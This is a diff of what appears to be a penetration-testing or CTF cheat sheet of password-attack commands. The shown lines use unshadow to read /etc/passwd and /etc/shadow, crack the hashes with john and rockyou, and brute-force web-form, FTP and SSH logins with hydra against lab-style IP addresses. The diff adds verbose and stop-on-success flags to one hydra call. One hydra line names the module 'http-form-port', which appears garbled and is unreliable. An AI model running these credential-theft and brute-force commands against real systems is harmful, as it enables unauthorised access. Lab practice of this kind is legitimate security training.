@@ -34,7 +34,7 @@ unshadow /etc/passwd /etc/shadow > hash
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt hash
  
 # hydra login brute force
-hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.80.107 http-post-form "/admin/:Username=^USER^&Password=^PASS^:Incorrect Credentials"
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.80.107 http-post-form "/admin/:Username=^USER^&Password=^PASS^:Incorrect Credentials" -f -V
 hydra -L wordlist.txt -P wordlist.txt 10.10.90.206 -s 8080 http-form-port "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&form=%2F&Submit=Sign+in:loginError"
 hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.158.58 ftp
 hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.67.168 ssh
